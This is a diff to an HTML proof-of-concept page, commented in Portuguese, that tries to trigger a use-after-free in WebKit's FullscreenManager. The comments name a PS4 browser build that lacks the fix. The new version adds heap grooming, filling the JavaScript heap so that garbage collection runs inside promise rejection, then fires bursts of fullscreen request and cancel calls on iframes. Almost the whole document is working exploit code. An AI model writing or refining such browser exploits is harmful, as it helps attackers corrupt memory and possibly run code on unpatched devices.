@@ -1,26 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head><title>FullscreenManager UAF PoC — 633fbf1</title></head>
+<head><title>FullscreenManager UAF PoC v2 — heap grooming</title></head>
 <body>
 
-<button id="btn" onclick="run(this)">&#9654; Run PoC (clique = gesto obrigatorio)</button>
+<button id="btn" onclick="run(this)">&#9654; Run PoC v2 (clique obrigatorio)</button>
 <pre id="log"></pre>
 
 <script>
 /*
- * PoC: Use-After-Free em FullscreenManager::requestFullscreenForElement
- * Commit fix: 633fbf1 | Bug: webkit.org/263140
+ * PoC v2: Use-After-Free em FullscreenManager::requestFullscreenForElement
+ * commit fix: 633fbf1 | bug: 263140
  *
- * Caminho vulneravel:
- *   failedPreflights:
- *     promise->reject()          <- pode libertar Document (DeferredPromise = ultima ref)
- *     m_document.eventLoop()     <- UAF se Document foi destruido acima
+ * Por que v1 nao crashou:
+ *   DeferredPromise mantem Strong<JSDOMGlobalObject> → raiz nativa JSC
+ *   GC externo (pre-task) nao consegue colectar o Document enquanto
+ *   a task estiver na fila com o RefPtr<DeferredPromise>
  *
- * Fix ausente no fonte PS4:
- *   Ref document { protectedDocument() };  <- NAO encontrado em FullscreenManager.cpp
+ * Estrategia v2: Heap Grooming
+ *   Encher o heap JSC ANTES das tasks rodarem.
+ *   Quando promise->reject() chama JSC::call() internamente e JSC tenta alocar,
+ *   o heap cheio forca GC DENTRO de reject().
+ *   Nesse momento, apos WTFMove(element) para GCReachableRef,
+ *   o GC pode colectar o element → Document refcount cai → UAF em m_document
  */
 
-/* ── GC via pressao de alocacao (fornecida) ── */
 function gc() {
     function gcRec(n) {
         if (n < 1) return {};
@@ -32,93 +35,126 @@ function gc() {
         gcRec(10);
 }
 
-/* ── GC complementar via ArrayBuffer grande ── */
-function gcHeavy() {
-    var bufs = [];
-    for (var i = 0; i < 30; i++) {
-        try { bufs.push(new ArrayBuffer(10 * 1024 * 1024)); } catch(e) { break; }
-    }
-    bufs = null;
-    gc();
-    gc();
-}
-
 var L = document.getElementById('log');
 function log(s) { L.textContent += '[' + new Date().toTimeString().slice(0,8) + '] ' + s + '\n'; }
 
-/*
- * Sequencia corrigida vs teste anterior:
- *
- *  1. requestFullscreen()           -> DeferredPromise criada (promise != null)
- *  2. webkitCancelFullScreen()      -> m_pendingFullscreenElement = nullptr  [SINCRONO]
- *  3. Zerar TODAS as refs JS        -> Document sem raizes JS
- *  4. gcHeavy()                     -> forcar coleta ANTES da task async rodar
- *  5. Task async dispara:
- *       m_pendingFullscreenElement(null) != element -> failedPreflights(element, promise)
- *         promise->reject()         -> se Document foi coletado no passo 4: UAF aqui
- *         m_document.eventLoop()    <- CRASH se m_document foi destruido
+/* ── Fase 1: Heap Grooming ──────────────────────────────────────
+ * Criar objectos de longa duracao que reduzem o heap disponivel.
+ * Mantidos vivos ate ao momento critico (promise->reject internamente).
+ * Assim, quando JSC::call() em reject() tenta alocar → GC forcado.
+ */
+var heapBalloon = null;
+
+function inflateBalloon() {
+    heapBalloon = [];
+    var allocated = 0;
+    for (var i = 0; i < 5000; i++) {
+        try {
+            /* Arrays de strings: objectos JSC heap, nao fora do GC */
+            heapBalloon.push(new Array(1000).fill('uaf_' + i));
+            allocated++;
+        } catch(e) {
+            break; /* OOM parcial: parar antes de crashar aqui */
+        }
+    }
+    log('Balloon: ' + allocated + ' arrays no heap JSC');
+    return allocated;
+}
+
+function deflateBalloon() {
+    heapBalloon = null;
+    gc();
+}
+
+/* ── Fase 2: Tentativa UAF ──────────────────────────────────────
+ * Com heap cheio, tasks pendentes, promise->reject() tem maior
+ * probabilidade de acionar GC durante JSC::call().
  */
 function attempt(n) {
     var iframe = document.body.appendChild(document.createElement('iframe'));
-    var iframeDoc  = iframe.contentDocument;
+    var iframeDoc = iframe.contentDocument;
     var div = iframeDoc.body.appendChild(document.createElement('div'));
 
-    /* PASSO 1: requestFullscreen — isFromPrefixedAPI = false, promise != null */
     var p = div.requestFullscreen();
-    log('[' + n + '] requestFullscreen -> ' + (p instanceof Promise ? 'Promise (vulneravel)' : typeof p));
 
     if (p instanceof Promise) {
         p.catch(function(e) {
-            /* este callback roda DEPOIS do UAF (microtask apos failedPreflights) */
-            /* se chegar aqui sem crash = fix presente ou GC nao coletou o Document */
-            log('[' + n + '] catch pos-UAF: ' + e + '  <- se nao crashou, Document sobreviveu');
+            /* microtask — corre APOS failedPreflights completar */
+            /* se chegamos aqui = sem crash = Document sobreviveu */
+            log('[' + n + '] catch: ' + e + ' (pos-task, sem crash)');
         });
     }
 
-    /* PASSO 2: cancelar SINCRONAMENTE — seta m_pendingFullscreenElement = nullptr
-     * Garante path: "mismatch" na task, nao "isConnected" (mais previsivel) */
+    /* Cancelar sincrono: m_pendingFullscreenElement = nullptr */
     iframeDoc.webkitCancelFullScreen();
-    log('[' + n + '] webkitCancelFullScreen() -> m_pendingFullscreenElement = null');
 
-    /* PASSO 3: zerar TODAS as referencias JS ao Document do iframe */
-    div      = null;
+    /* Zerar todas as refs JS — Document so vive via DeferredPromise C++ */
+    div       = null;
     iframeDoc = null;
     document.body.removeChild(iframe);
-    iframe   = null;
-    /* p (Promise JS) tambem zerada — DeferredPromise C++ pode ser a unica ref ao Document */
-    p        = null;
+    iframe    = null;
+    p         = null;
 
-    /* PASSO 4: GC MAXIMO antes da task async — Document deve ter zero raizes JS agora */
-    gcHeavy();
-    log('[' + n + '] gcHeavy() concluido — task async pendente na fila do eventLoop');
-
-    /* PASSO 5: task async do requestFullscreenForElement vai rodar no proximo tick:
-     *   if (m_pendingFullscreenElement != element.ptr())  <- TRUE (cancelamos no passo 2)
-     *       failedPreflights(element, promise)
-     *         promise->reject()                           <- UAF se Document coletado acima
-     *         m_document.eventLoop().queueTask(...)       <- CRASH esperado aqui
-     */
+    /* NAO rodar gc() aqui — balloon ja esta a pressionar o heap.
+     * Queremos que o GC dispare DENTRO de promise->reject(),
+     * nao antes. Se corrermos gc() agora podemos aliviar pressao. */
 }
 
-function run(btn) {
-    btn.disabled = true;
-    log('=== PoC: FullscreenManager UAF | 633fbf1 ===');
-    log('C++: Ref document{protectedDocument()} ausente em FullscreenManager.cpp');
-    log('Path: requestFullscreen(Promise) + webkitCancelFullScreen[sync] + gcHeavy');
-    log('');
-
-    var TENTATIVAS = 5;
-
-    for (var i = 0; i < TENTATIVAS; i++) {
+/* ── Fase 3: Burst de tentativas com heap sob pressao ──────────
+ * Quanto mais tentativas com heap cheio, maior a probabilidade
+ * de JSC::call() dentro de reject() triggerar GC no momento certo.
+ */
+function runBurst(count, label) {
+    log('--- burst: ' + label + ' (' + count + ' tentativas) ---');
+    for (var i = 0; i < count; i++) {
         attempt(i);
     }
+}
 
+/* ── Entrada principal ─────────────────────────────────────────── */
+function run(btn) {
+    btn.disabled = true;
+    log('=== PoC v2: FullscreenManager UAF | 633fbf1 ===');
+    log('Estrategia: heap grooming + burst de attempts');
+    log('');
+
+    /* Passo 1: enchemos o balloon de heap */
+    var allocated = inflateBalloon();
+    if (allocated < 100) {
+        log('AVISO: pouca memoria disponivel — resultado pode ser OOM antes do UAF');
+    }
+
+    /* Passo 2: burst rapido enquanto heap esta cheio
+     * As tasks ficam na fila do event loop.
+     * Quando o event loop processar as tasks, heap ainda cheio → 
+     * promise->reject() → JSC::call() → alocacao → GC forcado */
+    runBurst(20, 'heap cheio');
+
+    /* Passo 3: adicionar pressao extra com ArrayBuffers grandes
+     * (tipo de alocacao diferente — pode triggerar GC collector diferente) */
+    log('--- pressao extra com ArrayBuffers ---');
+    var bigBuffers = [];
+    for (var j = 0; j < 10; j++) {
+        try { bigBuffers.push(new ArrayBuffer(5 * 1024 * 1024)); } catch(e) { break; }
+    }
+    log('ArrayBuffers alocados: ' + bigBuffers.length + ' x 5MB');
+
+    /* Passo 4: burst final com pressao maxima */
+    runBurst(20, 'pressao maxima');
+
+    /* Liberar ArrayBuffers mas manter balloon */
+    bigBuffers = null;
+
+    /* Passo 5: aguardar processamento das tasks */
     setTimeout(function() {
         log('');
-        log('=== ' + TENTATIVAS + ' tentativas processadas ===');
-        log('Se nenhum crash: fix presente no binario OU GC nao coletou o Document');
-        log('Se crash/freeze antes daqui: UAF confirmado');
-    }, 3000);
+        log('=== tasks processadas ===');
+        log('Se chegou aqui: Document sobreviveu ao GC interno de reject()');
+        log('Hipoteses: (1) fix no binario, (2) GC nao triggera durante JSC::call()');
+        log('           (3) Strong<JSDOMGlobalObject> nao foi cleared durante reject()');
+        deflateBalloon();
+        log('Balloon liberado.');
+    }, 5000);
 }
 </script>
 
